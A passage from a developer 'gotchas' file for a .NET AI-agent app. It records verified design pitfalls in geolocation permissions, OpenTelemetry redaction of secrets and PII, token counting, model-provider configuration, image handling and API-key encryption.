  (`GetCurrentLocationAsync`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`GetCurrentLocation_ExposesNoParameters`), `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### WebKit has no geolocation Permissions API — gating on `state === "granted"` is dead on iOS

- **Claim:** `navigator.permissions.query({name: "geolocation"})` is **not supported in WebKit** — every
  browser on iOS/iPadOS — where it **rejects** rather than reporting a state. So the obvious design for
  "auto-attach the position once the user has granted permission" — gate purely on `state === "granted"` —
  is **silently dead on every iPhone**: the user taps grant, no fix is ever attached, and the grant button
  never hides. The authorization gate is therefore **two-legged**: the Permissions API where it exists
  (Chrome/Edge/Firefox, desktop + Android), and otherwise a `localStorage` flag set **only after a
  `getCurrentPosition()` actually succeeded** (an already-granted permission resolves without re-prompting,
  so capture under the flag never ambushes the user), cleared on a `PERMISSION_DENIED` (code 1) from any
  later capture — which is how a revocation in site settings gets noticed. Related and separate: the send
  path must **never** call `getCurrentPosition()` or await a fix — an awaited high-accuracy acquisition adds
  seconds to *every* message once the cached fix goes stale, so the fix is refreshed out of band and the
  send path reads the cache synchronously. The C# asset tests are source-text heuristics (no JS runner in
  the repo), so they cannot catch an engine deviation: **retest on a real iOS device** — same class of trap
  as the Chrome-on-Android speech gotcha.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/location.js` (`isCaptureAuthorized`, `currentLocationForSend`,
  `handlePositionError`), `tests/Agent42.Tests/LocationAssetsTests.cs`,
  `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### OTel redacts an HttpClient span's query string by default — and one env var un-redacts it

- **Claim:** `AddServiceDefaults` turns on `AddHttpClientInstrumentation()`, and `UserTelemetrySpanProcessor`
  stamps `user.email`/`user.full_name`/`user.roles` onto **every** span started under a request identity
  (ADR 0010) — so an outbound span joins *a named human* to whatever is in that request's URL. For the
  geocode call that URL's query string carries **the Google API key and the user's exact coordinates**. A
  spike settled the actual behaviour rather than trusting it: **OpenTelemetry.Instrumentation.Http 1.15.1
  redacts the query string by default**, recording `url.full` as `http://…/maps/api/geocode/json?*`. So no
  scrubbing is needed today — but this is a **library default, not a guarantee we own**: setting
  `OTEL_DOTNET_EXPERIMENTAL_HTTPCLIENT_DISABLE_URL_QUERY_REDACTION=true` (or an instrumentation upgrade that
  changes the default) would immediately start shipping the key and the user's position to the OTLP
  collector, attributed to them by name. If you enable that flag, scrub or filter `url.full` for the
  geocoding client first. Note this cuts the other way too: any *new* named client whose query string holds
  a secret is protected only by the same default.
- **And it never redacts the PATH — which is why the calendar client suppresses its span entirely.**
  Calendar REST v3 puts the calendar id and the event id in the path
  (`/calendars/{calendarId}/events/{eventId}`), and a calendar id is an **email address** — somebody
  *else's* for a shared calendar. Combined with the `user.*` stamping above, an unhandled span joins one
  named human to another named human's calendar in the collector, with no env var needed to "enable" it.
  `CalendarSpanSuppressingHandler` wraps each send in `SuppressInstrumentationScope.Begin()` (no new
  package — `OpenTelemetry` comes in transitively). Suppress rather than rewrite: a rewrite has to keep
  working as URL shapes grow, and timing for a third-party GET does not justify defending that. **Any new
  client whose PATH carries an identifier needs the same treatment — the query-string default above will
  not save it.**
  **One recorded exception, ADR 0056:** the Hindsight memory client puts the bank id in its path
  (`/v1/default/banks/{bankId}/…`) and is deliberately **not** suppressed. The rule above is about an
  identifier that names a *human* — a calendar id is somebody's email address. A Hindsight bank id is the
  Easy Auth principal id: opaque, and already exported on purpose as the `user.id` span attribute
  (ADR 0009/0010), so suppressing the span would hide nothing that is not already there. The recall query
  and the retained transcript ride in the request **body**, which OTel does not capture at all. Weigh a new
  client against *that* test — does the path name a person — rather than against the literal wording.
- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`AddHttpClientInstrumentation`),
  `src/Agent42.Backend/Telemetry/UserTelemetrySpanProcessor.cs`, `src/Agent42.Backend/Location/GoogleGeocoder.cs`,
  `src/Agent42.Backend/Calendar/CalendarSpanSuppressingHandler.cs`,
  `tests/Agent42.Tests/GoogleCalendarServiceTests.cs` (`CalendarSpan_DoesNotCarryTheCalendarIdInThePath`)
- **Verified:** 2026-08-26

### The usage dashboard counts tokens from `chat` spans ONLY — `orchestrate_tools` is the summed parent

- **Claim:** the usage dashboard (ADR 0031) is fed purely from the OTel gen_ai spans the chat client already
  emits, projected by `UsageSpanProjector`. The load-bearing rule is invisible in the aggregate numbers and
  easy to "fix" wrongly: a tool-calling turn emits **three** span kinds on the `Agent42.Backend` source —
  `chat` (per model round-trip, carries `gen_ai.usage.input_tokens`/`output_tokens`), `execute_tool` (carries
  `gen_ai.tool.name`, no tokens), and **`orchestrate_tools`, whose usage is the SUM of its child `chat`
  spans**. A spike (2026-07-22, Microsoft.Agents.AI 1.13.0 / Microsoft.Extensions.AI 10.6.0) showed the
  `orchestrate_tools` span carrying `input_tokens=140` = exactly the two child chats (100+40). So the
  projector **whitelists `chat` for tokens and `execute_tool` for tool events and DROPS everything else** —
  adding `orchestrate_tools` (or `invoke_agent`) to "capture more" double/triple-counts every multi-turn
  conversation. Three more facts the same spike pinned, each a silent trap: (1) the emitter emits **only**
  input/output tokens — **no cache-read, no reasoning** — so those dashboard fields are wire-contract parity
  only and are always 0 (do not "wire them up" from the span; they aren't there — the grain's `UsageContent`
  has cached, but that path is deliberately not used); (2) **all three span kinds are already on the
  registered `Agent42.Backend` source and already OTLP-exported**, so the ingestion processor needs **no new
  `AddSource`** and adds no new export/PII surface — it filters in `OnEnd`; (3) async paths (fired reminders,
  agent-run) have no request identity in `RequestContext`, so their `chat` spans carry no `user.*` and their
  tokens land in an **unreported** user bucket by design (correct total, no attribution).
- **Load-bearing storage bound:** the rollups live in ONE global grain (`UsageRollupGrain`, key `"global"`)
  riding `agent-state` on the `"usage-rollups"` state (the `UserPushGrain` pattern — no new container), which
  re-serializes into one ≤2 MB Cosmos item per write (ADR 0004). It **prunes on every write** (hourly ~48 h,
  daily ~92 d); `range=all` therefore means "the retained daily window", not all-time. Retention constants
  live only in `UsageRetention` — a longer window multiplies state toward the cap. The `application`
  dimension is **per-agent** (the grain publishes the agent name into `RequestContext`
  (`PublishUsageApplication`); `UserTelemetrySpanProcessor` stamps it as the `agent42.application` span tag
  at OnStart — the ADR 0010 mechanism; the projector reads it, non-agent chats fall back to `"Agent42"`), so
  many agents multiply the bucket rows — shard by day into per-date grains before that bites. **Do not add
  the dimension by overriding `gen_ai.operation.name`** — that is set by the libraries per the OTel semconv
  and is also exported (ADR 0009); a new dimension is always a NEW tag, never a rewrite of a semconv one.
- **Evidence:** `src/Agent42.Agents/Telemetry/UsageSpanProjector.cs` (the operation-name whitelist; `ApplicationTag`),
  `src/Agent42.Agents/Conversations/AgentGrain.cs` (`PublishUsageApplication`),
  `src/Agent42.Backend/Telemetry/UserTelemetrySpanProcessor.cs` (stamps `agent42.application`),
  `src/Agent42.Agents/Telemetry/UsageRollupState.cs` (`UsageRetention`, `Prune`), `src/Agent42.Agents/Telemetry/UsageRollupGrain.cs`,
  `src/Agent42.Backend/Telemetry/UsageSpanProcessor.cs` (`OnEnd`, best-effort enqueue),
  `tests/Agent42.Tests/UsageSpanProjectorTests.cs` (`AggregateSpan_IsNotCounted`),
  `.agentic/decisions/0031-token-usage-dashboard.md`, `.agentic/decisions/0004-attachments-in-blob.md`
- **Verified:** 2026-07-22

### A GitHub model id contains a `/`, so the provider separator is `:` — and the split is on the FIRST colon

- **Claim:** the obvious separator for a qualified model id is `/`, and it is **wrong**: GitHub Models'
  *own* ids are `publisher/name` (`openai/gpt-4o-mini`), so `provider/model` cannot be split
  unambiguously. Ids are **`<provider>:<model>`, split on the FIRST colon**; everything after it is the
  provider's opaque string and is never parsed further (an Ollama tag like `ollama:llama3.1:8b` survives
  intact). The load-bearing consequence is the *other* branch: an id with **no** colon is a **legacy** id
  and resolves against the default provider — that is the entire reason ADR 0013 needed **no state
  migration**, because every conversation persisted before it holds a bare `gpt-4o`. Related, and easy to
  get wrong in the same breath: `AgentGrainState.DeploymentName` **keeps its name and its `[Id(2)]`** even
  though it now holds a qualified id. Which serializer the Cosmos grain-storage provider actually uses
  (Orleans binary field-ids vs. JSON property names) is **unverified**, and if it is JSON, renaming the
  property silently orphans the model on every existing conversation.
- **Evidence:** `src/Agent42.Backend/Models/ModelProviderOptions.cs` (`ModelId.Parse`),
  `src/Agent42.Agents/Conversations/AgentGrainState.cs` (`DeploymentName` + its comment),
  `tests/Agent42.Tests/ModelIdTests.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`LegacyPersistedModel_StillResolves`), `.agentic/decisions/0013-multi-provider-model-catalog.md`
- **Verified:** 2026-07-14

### `AgentSkillsProvider` is a TOOL — a no-tools model must drop it too, and the RAG provider must NOT be dropped

- **Claim:** gating a model with `SupportsTools: false` looks like it means "pass `Tools = []`". It does
  not: `AgentSkillsProvider` exposes a **`load_skill` function** to the model, and it is registered as an
  `AIContextProvider`, not in the `Tools` list — so dropping the seven `AIFunctionFactory` tools while
  leaving the skills provider on still hands the model a function schema it cannot handle (on GitHub
  Models, `microsoft/phi-4` answers a tools request with a flat **HTTP 400**). The two context providers
  are therefore gated **differently, on purpose**: the skills provider goes when tools go, while the
  document `TextSearchProvider` (ADR 0008) is **not** a tool — it *injects* excerpts before the call — and
  must stay on regardless, or a document conversation silently loses retrieval the moment it moves to a
  text-only model. The asymmetry is invisible in the types; both are just `AIContextProviders` entries.
  `FakeChatClient` echoes the tool schemas it is handed **by name** (`[tools:a,b,c]`) rather than a count,
  precisely so the "and no `load_skill`" half is assertable. **Same rule for the ADR 0021 selection layer, and as of ADR 0048 the
  gate is "at least ONE selected skill", not `enabled.Contains(skills)`:** skills are selectable
  individually (`skill:{name}`), so `BuildAgent` resolves the selected skill **directory paths** and
  constructs `AgentSkillsProvider` **only when that list is non-empty** — `skillsProvider is not null` is
  the switch-arm condition. Building it from an empty path list would advertise no skills yet still hand the
  model a `load_skill` schema, which is this trap wearing a different hat. It is still never a filter on the
  `Tools` list (the provider's tools are never in it). And the provider surfaces **three** tools, not one —
  `load_skill`, `read_skill_resource`, `run_skill_script` — so `ToolCatalog` maps all three to the `skills`
  key, which is why that key keeps its `ToolNameToKey` entries even though it became a wildcard (the
  key-coverage guard test found this).

  **As of ADR 0057 the RAG-vs-skills asymmetry above is a THREE-way split, and the new arm breaks the
  rule the other two follow.** Long-term memory (`ToolCatalog.Memory`) is like RAG in being *not a tool*,
  and like skills in being *selectable* — so it is gated by the selection but **NOT** by capability:

  | provider | is a tool? | gated by capability | gated by selection |
  |---|---|---|---|
  | `AgentSkillsProvider` | yes (`load_skill`) | yes | yes (`skill:{name}` / `skills`) |
  | RAG `TextSearchProvider` | no | no | no — document presence only (ADR 0008) |
  | Hindsight memory | no | **no** | **yes** (`memory`) |

  The tidy-looking mistake is now the reverse of the original one: memory owns a catalog key, so folding
  it in beside the skills provider under `capabilities.SupportsTools` reads as consistency and is wrong —
  a text-only model with `memory` selected **must** still get memory. `NoToolModel_StillGetsMemory`
  (null selection) and `MemorySelection_IsNotIntersectedWithCapability` (explicit selection) are the two
  guards, and they cover different halves: a null selection never reaches the predicate at all.

  **A skill whose frontmatter `name` disagrees with its directory name is SILENTLY INVISIBLE** (measured,
  1.13.0, ADR 0048): `AgentFileSkillsSource` returns an **empty list — it does not throw** — for that
  directory. So the framework enforces `name == directory name`, skill names are unique for free, and a
  renamed directory that forgets its `SKILL.md` drops the skill out of the picker with no error anywhere.
- **Evidence:** `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs` (`BuildAgent`'s `selectedSkillPaths`
  gate and its `AIContextProviders` switch),
  `src/Agent42.Agents/Tools/SkillCatalog.cs` (`Discover`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`NoToolModel_RegistersNoTools_AndNoSkillsProvider`,
  `NoToolModel_StillGetsDocumentRetrieval`, `SkillsDisabled_DropsLoadSkill_KeepsRetrieval`,
  `PerSkillSelection_AdvertisesOnlySelectedSkill`),
  `tests/Agent42.Tests/SkillCatalogTests.cs` (`Discover_ToleratesBadInput` — pins the name/directory rule),
  `tests/Agent42.Tests/FakeChatClient.cs` (`ToolsEcho`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`NoToolModel_StillGetsMemory`,
  `MemorySelection_IsNotIntersectedWithCapability` — the ADR 0057 three-way arm),
  `.agentic/decisions/0048-per-skill-selectable-tools.md`,
  `.agentic/decisions/0057-memory-as-a-selectable-tool.md`
- **Verified:** 2026-08-29

### The boot chat is not created via `startNewConversation()` — seed its composer state explicitly

- **Claim:** the fresh chat waiting on page load is **not** run through `startNewConversation()`. It exists
  purely from module-load defaults (`activeId = crypto.randomUUID()`, `chatTools = []`), and the init block
  only fires the loaders (`initTheme` → `loadProfile`, `loadTools`). So any per-chat composer state that
  `startNewConversation()` seeds from a preference — today the ADR 0021 tool selection
  (`chatTools = profile.enabledTools ?? allToolKeys()`) — is **skipped for the boot chat** unless seeded
  separately. The trap is invisible because the manual "New chat" button *does* call
  `startNewConversation()`, so it works everywhere except the one chat the user sees first. The seed must
  wait for **both** `/api/profile` (for `enabledTools`) and `/api/tools` (for `allToolKeys()`) to resolve —
  the loaders are async and un-awaited — and must be **guarded** (`activeId === bootChatId &&
  activeAgentId === null`) so a share hand-off or an opened conversation that raced ahead isn't clobbered.
  Note this is a **display** bug, not a wrong-tools bug: the grain already resolves
  `override ?? user-default ?? all` and `send()` never PUTs `chatTools` — but leaving the popover showing an
  empty set means a user who toggles one tool PUTs a near-empty override, silently discarding their default.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/main.js` (init block's `Promise.all([profileReady, toolsReady])`
  seed), `src/Agent42.Backend/wwwroot/js/conversations.js` (`startNewConversation`),
  `AgentGrain.EffectiveEnabledTools`
- **Verified:** 2026-07-24

### Withholding images from a no-vision model must cover HISTORY, not just the new turn

- **Claim:** "don't attach the image when the model can't see it" is only half the gate, and the missing
  half is the one that leaks. Prior turns' image parts **live on in the serialized session** and are
  replayed to the model on every later turn (which is also why `RehydrateAttachmentUrlsAsync` exists at
  all) — so a conversation that switches to a text-only model would still ship **every earlier image URL**
  to it. That URL is a **SAS into our private `attachments` container** (ADR 0004), and a third-party
  model's host really does fetch what it is given (ADR 0013 spike confirmed it against GitHub Models) — so
  this hands a live credential-bearing URL to an endpoint outside the tenant, for an image it cannot even
  read. The withholding is done in the rehydrate pass and is **reversible**: it reads `TurnAttachments`
  (the durable per-turn record) rather than deleting parts, so switching back to a vision model
  *restores* them. A destructive strip would blind the conversation's history forever after one visit to
  a text-only model. Note the test marker: `[img:N]` counts only the **last** user message, so it cannot
  see this bug — `[allimg:N]`, which counts image parts across the whole request, is the one that can.
- **And stripping the parts is not enough: an IMAGE-ONLY turn is left EMPTY.** The composer deliberately
  allows a blank-text turn with a photo attached, so that message's *only* content part is the image.
  Remove it and the message has **zero** content parts — which OpenAI-compatible endpoints reject
  outright, bricking the conversation on precisely the third-party model this feature exists for. It gets
  a **placeholder `TextContent`** instead. (`StripToolHistory` can simply drop an emptied message; this
  cannot — the `TurnAttachments`↔user-turn join is **positional**, so dropping a turn misaligns every
  image after it.) A `FakeChatClient` cannot reject an empty message the way the real service does, so
  the test for this would pass vacuously — hence the `[emptymsg:N]` echo, which makes the property
  observable. Mutation-checked: remove the placeholder and `NoVisionModel_ImageOnlyTurn_StillReplies`
  fails.
- **Evidence:** `src/Agent42.Agents/Attachments/AgentGrain.Attachments.cs` (`RehydrateAttachmentUrlsAsync(bool includeImages)`,
  `StripImageParts`, `WithheldImagePlaceholder`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`NoVisionModel_SendsNoImageContent`, `NoVisionModel_ImageOnlyTurn_StillReplies_AndSendsNoImage`),
  `tests/Agent42.Tests/FakeChatClient.cs` (`AllImagesEcho`, `EmptyMessageEcho`)
- **Verified:** 2026-07-14

### An assistant generated image is id-keyed (message-level prop), never joined by assistant-message position

- **Claim:** a generated image (ADR 0020) is the *assistant* twin of a user attachment, but the two must NOT
  share the positional join. User images work because there is **exactly one `ChatRole.User` message per
  turn**, so `TurnAttachments[userTurnIndex]` aligns. The **assistant side is not 1:1 with turns**: a
  tool-calling turn emits a *standalone* `FunctionCallContent` assistant message **plus** a separate text
  assistant message (true even offline — `FakeChatClient` emits both), so any list keyed on assistant-**message
  index** drifts by one for every prior tool turn — misaligning the image against the wrong bubble AND the
  vision-gate strip/restore. So generated images are stored **id-keyed** in `AgentGrainState.GeneratedImages`
  (`Dictionary<string, AttachmentRef>`), and the link from the session's assistant message to its ref is an
  **`assistantImageId` in the message's MESSAGE-LEVEL `AdditionalProperties`** — not the content-level prop,
  because the Step-0 spike proved the message-level id survives BOTH session serialize/deserialize AND the
  image-strip (the content-level `UriContent` is removed when withholding from a no-vision model, so an id
  living only on the `UriContent` would be lost). History, the most-recent-image walk (edit input), and the
  strip/restore all look up by that id. Two more traps: (1) the image-gen branch runs in `ChatCoreAsync`
  **before** the chat vision-gate — an image model *consumes* images (it edits them), so it must not be routed
  through the withhold-from-a-no-vision-model gate; (2) `AgentGrain`'s own image abstraction is
  **`IImageGenerationService`, not `IImageGenerator`** — M.E.AI 1.13 ships `Microsoft.Extensions.AI.IImageGenerator`,
  and a same-named type is an ambiguous reference (CS0104) in any Backend file importing both namespaces (the
  spike hit this on `ImageGenerationOptions`). The offline harness cannot reach a real `/v1/images` endpoint
  (`InMemoryImageGenerator` returns a canned PNG), so the prod `OpenAIImageGenerator` is prod-smoke only; the
  id-keyed correctness IS testable — `NoVisionModel_WithholdsAssistantImage_AndRestores_AcrossToolTurn`
  interleaves a tool turn **before** the image turn so a positional bug would surface (a clean single-turn test
  would pass vacuously).
- **Evidence:** `src/Agent42.Agents/ImageGeneration/AgentGrain.ImageTurn.cs` (`GenerateImageTurnAsync`, `RecordImageTurnAsync`,
  `AssistantImageRef`, `FindMostRecentImageRef`, `AssistantImageIdKey`),
  `src/Agent42.Agents/Attachments/AgentGrain.Attachments.cs` (`RehydrateAssistantImageAsync`),
  `src/Agent42.Agents/Conversations/AgentGrainState.cs` (`GeneratedImages`),
  `src/Agent42.Agents/ImageGeneration/IImageGenerationService.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`NoVisionModel_WithholdsAssistantImage_AndRestores_AcrossToolTurn`, `History_IncludesAssistantGeneratedImage`),
  `.agentic/decisions/0020-image-generation-model-capability.md`
- **Verified:** 2026-07-17

### Image request shape: send NO `response_format` (gpt-image-1 400s), and NO `api-version` (Azure won't work)

- **`response_format` must NOT be sent.** The current OpenAI image model **`gpt-image-1` rejects
  `response_format` with `HTTP 400 unknown_parameter`** ("Unknown parameter: 'response_format'") — it always
  returns base64 — while the older `dall-e-*` models accept it and otherwise default to a hosted **URL**. The
  first cut of `OpenAIImageGenerator` set `ResponseFormat = GeneratedImageFormat.Bytes` unconditionally, which
  **broke every `gpt-image-1` endpoint** (observed on the wire, HTTP 400). The fix: send an empty
  `ImageGenerationOptions()`/`ImageEditOptions()` (no `response_format`) and resolve the result **either way** —
  prefer inline `ImageBytes` (`gpt-image-1`), else download `ImageUri` (`dall-e`, via a plain static
  `HttpClient` — not a named/DI one, so it dodges the retry-pipeline gotcha; the URL is the user's own
  configured provider's, so it stays off the SSRF path per ADR 0018). Don't "restore" `ResponseFormat` to
  force bytes — it regresses `gpt-image-1`.
- **The image path also sends NO `api-version` — so an Azure/Foundry image endpoint won't work as OpenAICompatible.**
- **Claim:** image generation (ADR 0020) rides `Provider.OpenAICompatible`'s plain `OpenAIClient`
  (`OpenAIClient(...).GetImageClient(model)`), the SAME client shape as the OpenAI-compatible *chat* path —
  **not** the Azure SDK. A spike against the pinned `OpenAI 2.12.0` (capturing the outbound request URI with
  a short-circuiting pipeline policy) confirmed the requests are exactly `POST {endpoint}/images/generations`
  and `POST {endpoint}/images/edits` with **no `api-version` query parameter** (with `endpoint` ending
  `/v1`, that is `/v1/images/generations`). `api-version` is an **Azure-ism** added only by
  `AzureOpenAIClient`, which is used solely on the Foundry *chat* path — never here. Consequence: a real
  OpenAI-compatible image endpoint (OpenAI itself, or a self-hosted vLLM/Ollama-style server implementing the
  `/images/generations` + `/images/edits` shape) works with no `api-version`, which is correct for it — but an
  **Azure OpenAI / Foundry image deployment configured as an `OpenAICompatible` provider will fail**, because
  Azure requires BOTH `?api-version=…` AND a different URL shape
  (`/openai/deployments/{deployment}/images/generations`). This is why ADR 0020 scopes image gen to
  OpenAI-compatible endpoints and puts Foundry image gen out of scope. Adding Azure image support later means
  a Foundry-flavored image path (an `api-version` policy + the deployment URL), analogous to how the Responses
  chat path already does its `api-key`-header + `/openai/v1` handling (ADR 0014/0017) — not a config tweak.
- **Evidence:** `src/Agent42.Backend/ImageGeneration/OpenAIImageGenerator.cs` (no `ResponseFormat`; `ResolveBytesAsync`
  bytes-or-URL fallback; the SDK `ImageClient` calls),
  `src/Agent42.Backend/Models/ChatClientFactory.cs` (`Provider.OpenAICompatible` builds the client image gen reuses),
  `.agentic/decisions/0020-image-generation-model-capability.md` (Foundry image gen out of scope)
- **Verified:** 2026-07-17

### The Foundry provider's endpoint + ARM coordinates are INHERITED — never copy them into `Models:`

> **Amended by ADR 0019 (2026-07-17):** the app **no longer ships a baseline `foundry` chat provider** —
> `Models:Providers` is now `{}` and chat is fully per-user (ADR 0018). The inheritance MECHANISM below
> (`ResolveFoundry` falling back to `AzureOpenAI:*`) still exists in code and would apply to a baseline
> Foundry provider re-added to `appsettings`, but no shipped provider exercises it. Two concrete claims
> below are now dead: the `Models:Default` derivation is **gone** (Default stays `""`; there is no operator
> default), and `AzureOpenAI:DeploymentName`/`SubscriptionId`/`ResourceGroup`/`AccountName` (+ their Bicep
> params/env vars) were **removed**. Only `AzureOpenAI:Endpoint`/`ApiKey`/`TenantId` remain (ADR 0030 removed
> `EmbeddingDeploymentName` too), and the key now authenticates **nothing** operator-side — `Endpoint`/`ApiKey`
> are the **dormant** Foundry-inheritance source and `TenantId` binds `DefaultAzureCredential`. See the "Chat is
> fully per-user" and "Embeddings are a per-user model" gotchas.

- **Claim:** the `foundry` provider in `appsettings.json` deliberately declares **none** of `Endpoint`,
  `ApiKey` (ADR 0017), `SubscriptionId`, `ResourceGroup`, `AccountName`, and that emptiness is load-bearing
  rather than an omission: all fall back to the top-level **`AzureOpenAI:*`** keys, which Bicep threads in
  as env vars (`AzureOpenAI__Endpoint`, `AzureOpenAI__ApiKey`) and which the **embedding client** — out of
  scope for multi-provider — also reads (the key especially: one `AzureOpenAI__ApiKey`, never a second
  `Models__Providers__foundry__ApiKey`). Copying the endpoint into `Models:Providers:foundry:Endpoint` creates a
  second source of truth, and prod then silently talks to whatever appsettings says while the Bicep param
  points somewhere else. Declaring all four is exactly how a **second** Foundry account is added (and it
  must be all four: `AzureModelCatalog` is constructed **per discovering provider** with *its own*
  coordinates — a single shared catalog reading the three global keys would make account #2 enumerate
  account #1's deployments and label them as its own, which is silently wrong rather than a failure).
  Two things a second account does **not** get for free: embeddings stay on the primary account, and it
  must declare its **own `ApiKey`** (ADR 0017 — a key-based Foundry provider authenticates by key, not an
  MI grant; the *Cognitive Services OpenAI User* grant is no longer the mechanism).
- **The same rule governs `Models:Default`, and it is easy to miss.** `AzureOpenAI:DeploymentName` is
  threaded in by Bicep (`AzureOpenAI__DeploymentName`), so `Models:Default` is left **empty** in
  appsettings and derived as `foundry:<AzureOpenAI:DeploymentName>`. Hardcoding `"foundry:gpt-4o"` there
  — which the first draft did — silently overrides the env var and turns the Bicep param into **dead
  config**: it looks authoritative and changes nothing. Exactly the trap shape as SearXNG's inert
  `server.port` below.
- **Evidence:** `src/Agent42.Backend/Models/ModelProviderOptions.cs` (`ProviderSettings.ResolveFoundry` — the
  inheritance mechanism, still live for a re-added baseline Foundry provider),
  `src/Agent42.Backend/Models/ModelProviderBuilder.cs`, `src/Agent42.Backend/appsettings.json` (the `"//Default"`
  comment; the `foundry` block was removed by ADR 0019),
  `tests/Agent42.Tests/ModelProviderTests.cs`
  (`TwoFoundryProviders_ResolveOwnCoordinates_AndInheritWhenAbsent`),
  `.agentic/decisions/0017-foundry-provider-api-key-auth.md` (the `ApiKey` inheritance),
  `.agentic/decisions/0019-remove-baseline-chat-providers.md` (baseline removed)
- **Verified:** 2026-07-16

### A user provider overlay is best-effort (baseline wins) and its endpoint is deliberately NOT SSRF-guarded

> **Amended by ADR 0019 (2026-07-17):** the baseline chat set now ships **EMPTY** (`Models:Providers: {}`),
> so "baseline wins" is **vacuous for chat** — there is no baseline chat entry to fall back to. The
> best-effort merge rule (an `Invalid`/`Skipped` overlay build keeps the baseline entry **if one exists,
> else skips**) is unchanged in code, but with an empty baseline "else skips" is the only branch that ever
> fires for chat. A user with no valid provider ends up with **zero** providers and an empty picker (the
> grain then stays valid via a no-op client — see the "Chat is fully per-user" gotcha). Only the **embedding**
> `AzureOpenAI:*` key is still an availability floor. The SSRF-guard-free endpoint claim below is unchanged.

- **Claim:** a signed-in user can add/override providers (ADR 0018), but that overlay is layered **after**
  boot and must **never** brick the app. ~~The operator env/`appsettings` set stays the boot-time
  availability floor~~ (ADR 0019: the **chat** baseline is now empty; only embeddings remain a floor):
  `ModelProviderBuilder.Build` still **throws** on a blank *baseline* Foundry key when one is configured
  (ADR 0017), but no baseline chat provider ships. The per-user path — `UserProviderResolver.Merge` calls the
  **same** `ModelProviderBuilder.TryBuildProvider` per provider (one home for the Foundry inheritance / skip /
  fatal rules — do not duplicate them), but on an `Invalid`/`Skipped` result it **keeps the baseline-built
  entry if one exists, else skips** — never throws. With the baseline now empty, a bad override simply leaves
  the user with fewer (often zero) providers. Two more consequences that are easy to get wrong: (1) user
  overlay providers do **NOT** inherit the operator `AzureOpenAI:*` secrets — the resolver builds them with
  an **empty** `IConfiguration` (`NoInheritance`), both so the operator key never reaches a user-chosen
  endpoint and so a blanked user Foundry key genuinely resolves `Invalid` (otherwise it would silently
  re-inherit and the fall-back could never be tested); (2) the overlay default is honoured **only** when it
  names a provider that actually built, else the baseline default stands — passing an unbuilt default to
  `MultiProviderChatClientFactory` would throw in `Resolve`.
- **The user endpoint is deliberately NOT SSRF-guarded — keep it that way.** It must accept
  `http://localhost:11434` (Ollama) and other private hosts (a supported target), so it carries **no SSRF
  address-guard**; validation is only absolute `http`/`https` + a parseable `Kind`. This is safe **only**
  because the endpoint comes from the authenticated user's **own persisted config**, never from a model or
  a live request — the property that distinguishes config from a model/request-supplied address (the
  distinction ADR 0011's fetch guard once enforced, before ADR 0027 removed that path). Do not add an
  address guard here, and do not let any future change accept a provider endpoint from a tool argument or
  request body — that would make it a genuine SSRF sink.
- **Evidence:** `src/Agent42.Backend/Models/UserProviderResolver.cs` (`Merge`, `NoInheritance`, `EffectiveDefault`),
  `src/Agent42.Backend/Models/ModelProviderBuilder.cs` (`TryBuildProvider` / `Build`),
  `src/Agent42.Backend/Models/AgentApi.Models.cs` (`ValidateProvider` — no guard),
  `tests/Agent42.Tests/UserProviderResolverTests.cs`
  (`FoundryOverrideWithBlankKey_FallsBackToBaseline`, `OverlayDefault_NamingAMissingProvider_FallsBackToBaselineDefault`),
  `tests/Agent42.Tests/ProvidersApiTests.cs` (`AcceptsLocalhost_RejectsMalformed`)
- **Verified:** 2026-07-16

### A user provider's API key is encrypted, never echoed — and its Data Protection key ring MUST persist

- **Claim:** user provider secrets (ADR 0018) are encrypted with `IDataProtector` **before** they reach the
  overlay grain (`ProviderSecretProtector`): the grain stores **ciphertext only**, `GET /api/providers`
  masks to `hasKey: bool` (never the ciphertext, never plaintext), and the key rides a distinct
  `"providers"` grain state — never the 2 MB session (ADR 0004). On update a **blank** `ApiKey` means
  "keep the stored key" (the field is write-only in the UI), mapped as a null ciphertext the grain reads as
  "keep". The load-bearing trap is **key-ring persistence**: in prod the ring MUST persist out-of-process,
  or a restart rotates it and every stored secret becomes undecryptable. `Program.cs` gates that on the
  **prod `Storage:BlobEndpoint` branch** (NOT `GetConnectionString("blobs")`, the Azurite/AppHost path) and
  uses the **MI `PersistKeysToAzureBlobStorage(BlobClient)` overload** — the connection-string overload
  cannot work because shared-key auth is disabled on the account. DevHost/tests use the default **ephemeral**
  ring (nothing persisted there). **Precise posture:** the user secrets are DP-encrypted; the DP **master
  key** itself sits in the `dataprotection` blob container protected only by **Storage SSE + RBAC** (no
  `ProtectKeysWith…`) — not "encrypted at rest" in the envelope-key sense. `Unprotect` **swallows**
  `CryptographicException` → null (a rotated ring degrades the provider to "no key", never throws).
- **Evidence:** `src/Agent42.Backend/Models/ProviderSecretProtector.cs`, `src/Agent42.Backend/Program.cs`
  (the `AddDataProtection` block), `src/Agent42.Backend/Mcp/AgentApi.Mcp.cs` (`Mask`, `ToStored`),
  `infra/modules/storage.bicep` (the `dataprotection` container),
  `tests/Agent42.Tests/ProviderSecretProtectorTests.cs`, `tests/Agent42.Tests/ProvidersApiTests.cs`
  (`Get_NeverReturnsKey`, `Put_BlankKey_KeepsStoredKey`)
- **Verified:** 2026-07-16

### The per-user chat-client factory is resolved on grain activation, not injected — order matters

- **Claim:** because providers are now per-user (ADR 0018), `AgentGrain` can no longer take a singleton
  `IChatClientFactory` in its constructor. It takes `IUserChatClientFactoryProvider` and resolves a
  **user-scoped** `_chatClientFactory` **once** in `OnActivateAsync` — from the userId parsed off its grain
  key (everything before the **first** `/` of `{userId}/{conversationId}`; a userId is an opaque Easy-Auth
  principal id with no `/`). **Hard ordering constraint:** the `await …GetForUserAsync(userId)` assignment
  MUST run **before** the first dereference of `_chatClientFactory` (the `_modelId` assignment and the
  `BuildAgent` call right after) — resolving it later NREs. The sync `IChatClientFactory` interface and its
  ~8 in-grain call sites are unchanged; only the resolution moved. Ripple to remember: every host that
